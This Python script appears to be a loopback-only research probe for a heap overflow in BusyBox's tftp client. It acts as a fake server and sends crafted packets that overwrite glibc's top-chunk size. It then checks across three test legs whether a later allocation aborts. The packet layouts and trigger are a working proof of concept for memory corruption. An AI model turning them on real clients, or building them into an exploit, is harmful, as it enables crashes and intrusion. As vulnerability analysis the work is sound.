#!/usr/bin/env python3
"""Loopback-only probe: does the TFTP DATA consumer path malloc after the
blksize-fallback overflow?

Sections 7-9 exercised the ERROR consumer (opcode 5), whose only
post-overflow malloc is the error-formatting vasprintf immediately before
exit. The DATA consumer (opcode 3, matching block number) instead writes the
overflowed rbuf to the local file and continues the receive loop -- the one
consumer where a later allocation could touch the corrupted top chunk.

The wire-controlled top-chunk size word at rbuf+72 is set to an aborting
value (0x4141414141414141). glibc's `size > av->system_mem` guard turns ANY
malloc after the corruption into `malloc(): corrupted top size` SIGABRT: a
sensitive, unambiguous detector. No code is injected; real loopback UDP.

A short DATA block (84 bytes total = 4 header + 80 payload) is used so the
12-byte overflow still covers rbuf+72..79, while full_write sees 80 != 512
and sets `finished=1`, keeping the file from being unlinked on exit (tftp.c
:703, :745-746, :759-760). The file bytes at offset 68..75 are the chosen
top-size word, proving the OOB bytes reach a real sink.

Legs:
  A  DATA, aborting top size -> no abort, 80-byte file expected
  B  ERROR, aborting top size -> abort (detector control)
  C  DATA, original top size -> no abort, 80-byte file expected
"""
import os
import socket
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
BINARY = os.path.abspath(sys.argv[1]) if len(sys.argv) > 1 else os.path.join(HERE, "busybox-plain")
ABORT_SIZE = 0x4141414141414141
ORIG_SIZE = 0x20cb1
EXPECT = b"AAAAAAAA"


def run_leg(name, consumer, top_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 0))
    sock.settimeout(3)
    port = sock.getsockname()[1]

    outfile = os.path.join(HERE, "data-probe-out.bin")
    try:
        os.unlink(outfile)
    except FileNotFoundError:
        pass

    cmd = [BINARY, "tftp", "-g", "-b", "64", "-l", outfile,
           "-r", "MISHE", "127.0.0.1", str(port)]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, cwd=HERE)

    req, peer = sock.recvfrom(2048)
    sock.sendto(struct.pack("!HH", 3, 0), peer)   # non-OACK block 0 -> fallback
    time.sleep(0.2)

    if consumer == "DATA":
        payload = bytearray(b"A" * 80)            # short block -> finished=1
        payload[68:76] = struct.pack("<Q", top_size)
        pkt = struct.pack("!HH", 3, 1) + bytes(payload)
    else:
        payload = bytearray(b"A" * 512)            # full block, ERROR consumer
        payload[68:76] = struct.pack("<Q", top_size)
        pkt = struct.pack("!HH", 5, 0) + bytes(payload)
    assert len(pkt) in (84, 516)
    sock.sendto(pkt, peer)

    try:
        while True:
            sock.recvfrom(2048)
    except socket.timeout:
        pass

    try:
        out, _ = proc.communicate(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, _ = proc.communicate()
    text = (out or b"").decode("utf-8", "replace")
    if os.path.exists(outfile):
        blob = open(outfile, "rb").read()
        size = len(blob)
        tail = blob[68:76].hex()
    else:
        size, tail = -1, "n/a"
    abort = "corrupted top size" in text or proc.returncode == -6
    print("LEG %s consumer=%s top=%#x rc=%d abort=%s filesz=%d oob@68=%s" %
          (name, consumer, top_size, proc.returncode, abort, size, tail))
    for line in text.splitlines():
        print("  OUT", line[:200])
    sock.close()


run_leg("A", "DATA", ABORT_SIZE)
run_leg("B", "ERROR", ABORT_SIZE)
run_leg("C", "DATA", ORIG_SIZE)
